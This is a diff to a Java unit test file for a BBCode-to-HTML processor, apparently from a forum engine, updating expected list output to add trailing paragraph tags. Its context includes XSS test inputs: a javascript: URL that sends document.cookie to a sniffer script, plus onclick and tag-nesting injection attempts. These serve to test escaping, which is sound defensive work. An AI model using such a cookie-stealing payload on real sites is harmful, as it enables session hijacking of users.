@@ -32,10 +32,10 @@ public class BBCodeTest {
   private static final String JAVASCRIPT_URL = "[url=javascript:var c=new Image();c.src=\"http://127.0.0.1/sniffer.pl?\"+document.cookie;close()]Test[/url]";
 
   private static final String LIST_TEST="[list][*]1[*]2[/list]";
-  private static final String LIST_RESULT="<p><ul><li>1<li>2</ul>";
+  private static final String LIST_RESULT="<p><ul><li>1<li>2</ul><p>";
 
   private static final String BADLIST_TEST="[list]0[*]1[*]2[/list]";
-  private static final String BADLIST_RESULT="<p><ul><li>1<li>2</ul>";
+  private static final String BADLIST_RESULT="<p><ul><li>1<li>2</ul><p>";
 
   @Test
   public void testLineBreak() throws BadURLException, SQLException {
@@ -97,7 +97,7 @@ public class BBCodeTest {
     proc.setIncludeCut(true);
     String result = proc.preparePostText(null, "[list][*][cut][/cut][/list]");
 
-    assertEquals("<p><ul><li></ul>", result);
+    assertEquals("<p><ul><li></ul><p>", result);
   }
 
   @Test
@@ -106,7 +106,7 @@ public class BBCodeTest {
     proc.setIncludeCut(false);
     String result = proc.preparePostText(null, "[list=\"[cut]\"][/list][/cut][list=\"[cut]\"][/list][/cut] onclick='alert(\"нифига не fixed\");return false'");
 
-    assertEquals("<p><ol type=\"&#91;cut&#93;\"></ol>[/cut]<ol type=\"&#91;cut&#93;\"></ol>[/cut] onclick='alert(&quot;нифига не fixed&quot;);return false'", result);
+    assertEquals("<p><ol type=\"&#91;cut&#93;\"></ol><p>[/cut]<ol type=\"&#91;cut&#93;\"></ol><p>[/cut] onclick='alert(&quot;нифига не fixed&quot;);return false'", result);
   }
 
   @Test
@@ -115,6 +115,6 @@ public class BBCodeTest {
     proc.setIncludeCut(false);
     String result = proc.preparePostText(null, "[b][list=\"[/b]\"][/list]");
 
-    assertEquals("<p>[b]<ol type=\"&#91;/b&#93;\"></ol>", result);
+    assertEquals("<p>[b]<ol type=\"&#91;/b&#93;\"></ol><p>", result);
   }
 }
